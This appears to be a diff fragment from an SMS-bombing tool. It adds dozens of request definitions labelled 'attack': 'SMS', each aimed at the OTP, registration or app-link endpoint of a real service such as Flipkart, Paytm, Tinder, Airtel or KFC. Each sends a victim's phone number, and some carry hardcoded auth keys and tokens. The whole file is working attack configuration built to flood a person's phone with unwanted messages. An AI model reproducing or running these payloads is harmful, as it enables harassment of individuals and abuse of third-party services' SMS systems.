+                'requestType': 'SENDOTP'
+            }
+        },
+        {
+            'info': {
+                'country': 'ALL',
+                'attack': 'SMS',
+                'website': 'newtonschools',
+                'anonymous': 'No'
+            },
+            'method': 'get',
+            'url': 'https://www.happyeasygo.com/heg_api/user/sendRegisterOTP.do',
+            'headers': {
+
+            },
+            'data': {
+                'phone': number
+            }
+        },
+        {
+            'info': {
+                'country': 'ALL',
+                'attack': 'SMS',
+                'website': 'newtonschools',
+                'anonymous': 'No'
+            },
+            'method': 'post',
+            'url': 'https://unacademy.com/api/v1/user/get_app_link/',
+            'headers': {
+
+            },
+            'data': {
+                'phone': number
+            }
+        },
+        {
+            'info': {
+                'country': 'ALL',
+                'attack': 'SMS',
+                'website': 'newtonschools',
+                'anonymous': 'No'
+            },
+            'method': 'post',
+            'url': 'https://www.treebo.com/api/v2/auth/login/otp/',
+            'headers': {
+
+            },
+            'data': {
+                'phone_number': number
+            }
+        },
+        {
+            'info': {
+                'country': 'ALL',
+                'attack': 'SMS',
+                'website': 'newtonschools',
+                'anonymous': 'No'
+            },
+            'method': 'get',
+            'url': 'https://www.airtel.in/referral-api/core/notify',
+            'headers': {
+
+            },
+            'data': {
+                'messageId': 'map',
+                'rtn': number
+            }
+        },
+        {
+            'info': {
+                'country': 'ALL',
+                'attack': 'SMS',
+                'website': 'newtonschools',
+                'anonymous': 'No'
+            },
+            'method': 'post',
+            'url': 'https://pharmeasy.in/api/auth/requestOTP',
+            'headers': {
+
+            },
+            'data': {
+
+            }
+        },
+        {
+            'info': {
+                'country': 'ALL',
+                'attack': 'SMS',
+                'website': 'newtonschools',
+                'anonymous': 'No'
+            },
+            'method': 'post',
+            'url': 'https://www.mylescars.com/usermanagements/chkContact',
+            'headers': {
+
+            },
+            'data': {
+                'contactNo': number
+            }
+        },
+        {
+            'info': {
+                'country': 'ALL',
+                'attack': 'SMS',
+                'website': 'newtonschools',
+                'anonymous': 'No'
+            },
+            'method': 'post',
+            'url': 'https://grofers.com/v2/accounts/',
+            'headers': {
+                'auth_key': '3f0b81a721b2c430b145ecb80cfdf51b170bf96135574e7ab7c577d24c45dbd7'
+            },
+            'data': {
+                'user_phone': number
+            }
+        },
+        {
+            'info': {
+                'country': 'ALL',
+                'attack': 'SMS',
+                'website': 'newtonschools',
+                'anonymous': 'No'
+            },
+            'method': 'post',
+            'url': 'https://api.dream11.com/sendsmslink',
+            'headers': {
+
+            },
+            'data': {
+                'siteId': '1',
+                'mobileNum': number,
+                'appType': 'androidfull'
+            }
+        },
+        {
+            'info': {
+                'country': 'ALL',
+                'attack': 'SMS',
+                'website': 'newtonschools',
+                'anonymous': 'No'
+            },
+            'method': 'get',
+            'url': 'https://www.cashify.in/api/cu01/v1/app-link',
+            'headers': {
+
+            },
+            'data': {
+                'mn': number
+            }
+        },
+        {
+            'info': {
+                'country': 'ALL',
+                'attack': 'SMS',
+                'website': 'newtonschools',
+                'anonymous': 'No'
+            },
+            'method': 'post',
+            'url': 'https://commonfront.paytm.com/v4/api/sendsms',
+            'headers': {
+
+            },
+            'data': {
+                'phone': number,
+                'guid': '2952fa812660c58dc160ca6c9894221d'
+            }
+        },
+        {
+            'info': {
+                'country': 'ALL',
+                'attack': 'SMS',
+                'website': 'newtonschools',
+                'anonymous': 'No'
+            },
+            'method': 'post',
+            'url': 'https://online.kfc.co.in/OTP/ResendOTPToPhoneForLogin',
+            'headers': {
+                'Referer': 'https://online.kfc.co.in/login',
+                '__RequestVerificationToken': '-zoQqa7WNa3z-mwOyqWHvcyYkCqYv0h7zqNUAqBivokB75ZiDj-LwQsGk4kB8QextV396CRJxxPAsWXfwYMoPFhMVlQBd1V0ONFeIrpj2C81:ub34fZv2vHPnub-TuF-vkK4rAkfKmIgnZFscecZJ3-kzvRU9CktNjLyLOCFNsixxFGbotqULbV41iHU2K-G0Aoqd4P4MQqIsjJm8tFkZga01'
+            },
+            'data': {
+
+            }
+        },
+        {
+            'info': {
+                'country': 'ALL',
+                'attack': 'SMS',
+                'website': 'newtonschools',
+                'anonymous': 'No'
+            },
+            'method': 'post',
+            'url': 'https://indialends.com/internal/a/mobile-verification_v2.ashx',
+            'headers': {
+                'Referer': 'https://indialends.com/personal-loan'
+            },
+            'data': {
+                'aeyder03teaeare': '1',
+                'ertysvfj74sje': '{cc}',
+                'jfsdfu14hkgertd': number,
+                'lj80gertdfg': '0'
+            }
+        },
+        {
+            'info': {
+                'country': 'ALL',
+                'attack': 'SMS',
+                'website': 'newtonschools',
+                'anonymous': 'No'
+            },
+            'method': 'post',
+            'url': 'https://www.flipkart.com/api/5/user/otp/generate',
+            'headers': {
+                'X-user-agent': user_agent()[0],
+                'Origin': 'https://www.flipkart.com',
+                'Content-Type': 'application/x-www-form-urlencoded'
+            },
+            'data': {
+                'loginId': f'+{number}'
+            }
+        },
+        {
+            'info': {
+                'country': 'ALL',
+                'attack': 'SMS',
+                'website': 'newtonschools',
+                'anonymous': 'No'
+            },
+            'method': 'post',
+            'url': 'https://qlean.ru/clients-api/v2/sms_codes/auth/request_code',
+            'headers': {
+
+            },
+            'data': {
+                'phone': number
+            }
+        },
+        {
+            'info': {
+                'country': 'ALL',
+                'attack': 'SMS',
+                'website': 'newtonschools',
+                'anonymous': 'No'
+            },
+            'method': 'post',
+            'url': 'https://cloud.mail.ru//api/v2/notify/applink',
+            'headers': {
+
+            },
+            'data': {
+                'phone': number,
+                'api': '2',
+                'email': 'email()',
+                'x-email': 'email()'
+            }
+        },
+        {
+            'info': {
+                'country': 'ALL',
+                'attack': 'SMS',
+                'website': 'newtonschools',
+                'anonymous': 'No'
+            },
+            'method': 'post',
+            'url': 'https://api.gotinder.com/v2/auth/sms/send',
+            'headers': {
+
+            },
+            'data': {
+                'phone_number': number
+            }
+        },
+        {
+            'info': {
+                'country': 'ALL',
+                'attack': 'SMS',
+                'website': 'newtonschools',
+                'anonymous': 'No'
+            },
+            'method': 'post',
+            'url': 'https://youla.ru/web-api/auth/request_code',
+            'headers': {
+
+            },
+            'data': {
+                'phone': number
+            }
+        },
+        {
+            'info': {
+                'country': 'ALL',
+                'attack': 'SMS',
+                'website': 'newtonschools',
+                'anonymous': 'No'
+            },
+            'method': 'post',
+            'url': 'https://api.ivi.ru/mobileapi/user/register/phone/v6',
+            'headers': {
+
+            },
+            'data': {
+                'phone': number
+            }
+        },
+        {
+            'info': {
+                'country': 'ALL',
+                'attack': 'SMS',
+                'website': 'newtonschools',
+                'anonymous': 'No'
+            },
+            'method': 'post',
+            'url': 'https://api.delitime.ru/api/v2/signup',
+            'headers': {
+
+            },
+            'data': {
+                'SignupForm[username]': 'username()',
+                'SignupForm[device_type]': '3'
+            }
+        },
+        {
+            'info': {
+                'country': 'ALL',
+                'attack': 'SMS',
+                'website': 'newtonschools',
+                'anonymous': 'No'
+            },
+            'method': 'post',
+            'url': 'https://www.icq.com/smsreg/requestPhoneValidation.php',
+            'headers': {
+
+            },
+            'data': {
+                'msisdn': number,
+                'locale': 'en',
+                'k': 'ic1rtwz1s1Hj1O0r',
+                'r': '45559'
+            }
+        },
+        {
+            'info': {
+                'country': 'ALL',
+                'attack': 'SMS',
+                'website': 'newtonschools',
+                'anonymous': 'No'
+            },
+            'method': 'post',
+            'url': 'https://api.ivi.ru/mobileapi/user/register/phone/v6/',
+            'headers': {
+
+            },
+            'data': {
+                'phone': number,
+                'device': 'Windows+v.43+Chrome+v.7453451',
+                'app_version': '870'
+            }
+        },
+        {
+            'info': {
+                'country': 'ALL',
+                'attack': 'SMS',
+                'website': 'newtonschools',
+                'anonymous': 'No'
+            },
+            'method': 'post',
+            'url': 'https://indialends.com/internal/a/mobile-verification_v2.ashx',
+            'headers': {
+                'Referer': 'https://indialends.com/personal-loan'
+            },
+            'data': {
+                'aeyder03teaeare': '1',
+                'ertysvfj74sje': '{cc}',
+                'jfsdfu14hkgertd': number,
+                'lj80gertdfg': '0'
+            }
+        },
+        {
+            'info': {
+                'country': 'ALL',
+                'attack': 'SMS',
+                'website': 'newtonschools',
+                'anonymous': 'No'
+            },
+            'method': 'get',
+            'url': 'https://m.redbus.in/api/getOtp',
+            'headers': {
+
+            },
+            'data': {
+                'number': number,
+                'cc': '{cc}',
+                'whatsAppOpted': False
+            }
+        },
+        {
+            'info': {
+                'country': 'ALL',
+                'attack': 'SMS',
+                'website': 'newtonschools',
+                'anonymous': 'No'
+            },
+            'method': 'post',
+            'url': 'https://my.newtonschool.co:443/api/v1/user/otp/',
+            'headers': {
+
+            },
+            'data': {
+                'phone': number
+            }
+        }
 ]
